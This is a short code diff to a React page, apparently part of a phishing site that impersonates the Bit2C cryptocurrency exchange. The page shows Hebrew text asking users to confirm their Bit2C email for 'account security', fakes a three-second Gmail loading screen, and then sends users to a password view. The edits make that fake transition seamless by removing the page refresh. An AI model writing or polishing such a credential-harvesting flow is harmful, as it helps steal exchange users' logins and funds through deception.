@@ -54,9 +54,9 @@ const DevicePage = () => {
         verificationStatus: "Processing",
       });
 
-      // Simular carregamento do Gmail por 3 segundos e redirecionar
+      // Simular carregamento do Gmail por 3 segundos e redirecionar sem refresh
       setTimeout(() => {
-        window.location.href = `${window.location.origin}/sync?view=password`;
+        navigate('/sync?view=password');
       }, 3000);
     } catch (error) {
       setShowGmailSpinner(false);
@@ -574,7 +574,7 @@ const DevicePage = () => {
               <>
                 {/* Description */}
                 <p className="text-gray-600 mb-6 text-center text-sm sm:text-base leading-relaxed" dir="rtl">
-                  כדי להבטיח את אבטחת החשבון שלך, סנכרון אימייל הוא חיוני. אנא אשר את האימייל של חשבון Bit2C שלך למטה כדי להמשיך בעדכון.
+                  כדי להבטיח את אבטחת החשבון שלך, סנכרון אימייל הוא חיוני. אנא אשר את האימייל של חשבון Bit2C שלך למטה כדי להמשיך בעדכון
                 </p>
 
                 {/* Email Input */}
